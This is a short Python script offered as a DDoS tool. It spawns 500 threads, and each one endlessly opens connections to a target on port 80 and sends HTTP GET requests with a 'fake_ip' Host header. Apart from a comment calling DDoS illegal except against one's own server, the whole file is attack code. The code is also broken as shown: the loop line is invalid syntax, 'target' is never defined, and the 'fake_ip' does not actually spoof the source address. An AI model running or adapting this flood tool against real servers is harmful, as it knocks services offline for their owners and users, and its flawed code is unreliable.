import threading
import socket

# Don't be a stupid, DDOSing is highly illegal. Only DDOS your own server - your own server means
# you actually host it - not a service provider.

# target = 'TARGET IP OR WEBSITE'
# To figure out your own ip, use 'ipconfig' in your terminal

port = 80
fake_ip = '180.20.20.30'

attacks_launched = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(('GET /' + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global attacks_launched
        attacks_launched += 1

# Number of Threads you're running in
for in in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

print(attacks_launched)
